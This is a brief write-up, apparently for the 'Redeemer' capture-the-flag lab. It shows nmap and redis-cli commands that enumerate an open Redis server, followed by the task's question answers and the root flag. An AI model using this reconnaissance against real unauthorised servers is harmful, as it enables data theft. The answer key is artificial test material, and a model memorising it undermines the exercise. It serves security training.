# Redeemer - Very Easy

```shell
nmap -T4 -p- -A 10.129.18.120

redis-cli -h 10.129.18.120 -p 6379

INFO

SELECT 0
#selects db0

KEYS *
#prints all keys

DUMP flag
#gives flag
```

1. Which TCP port is open on the machine? - 6379

2. Which service is running on the port that is open on the machine? - redis

3. What type of database is Redis? - In-memory database

4. Which command-line utility is used to interact with the Redis server? - redis-cli

5. Which flag is used with the Redis command-line utility to specify the hostname? - -h

6. Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? - INFO

7. What is the version of the Redis server being used on the target machine? - 5.0.7

8. Which command is used to select the desired database in Redis? - SELECT

9. How many keys are present inside the database with index 0? - 4

10. Which command is used to obtain all the keys in the database? - KEYS *

11. Root flag? - 03e1d2b376c37ab3f5319922053953eb
